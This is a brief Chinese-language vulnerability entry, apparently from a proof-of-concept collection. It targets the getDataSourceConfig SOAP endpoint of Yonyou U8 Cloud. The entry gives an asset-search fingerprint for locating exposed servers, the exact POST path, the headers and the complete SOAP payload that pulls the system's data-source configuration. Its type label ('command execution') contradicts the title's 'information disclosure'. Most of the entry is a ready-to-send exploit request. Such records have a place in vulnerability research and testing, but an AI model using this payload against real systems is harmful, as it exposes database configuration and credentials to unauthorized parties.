# 用友U8CloudgetDataSourceConfig存在信息泄露漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /uapws/service/nc.itf.ses.inittool.SESInitToolService HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=1EEDC1D7DC0B27ABD0731F81178DC50D.server; JSESSIONID=8BDDF6D86AFB789CF…`　`SOAPAction: urn:getDataSourceConfig`　`Content-Type: text/xml;charset=UTF-8`　`Host: xx.xx.xx.xx`　`Content-Length: 245`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ses="http://inittool.ses.itf.nc/SESInitToolService">
<soapenv:Header/>
<soapenv:Body>
<ses:getDataSourceConfig/>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 用友U8 Cloud getDataSourceConfig存在信息泄露漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud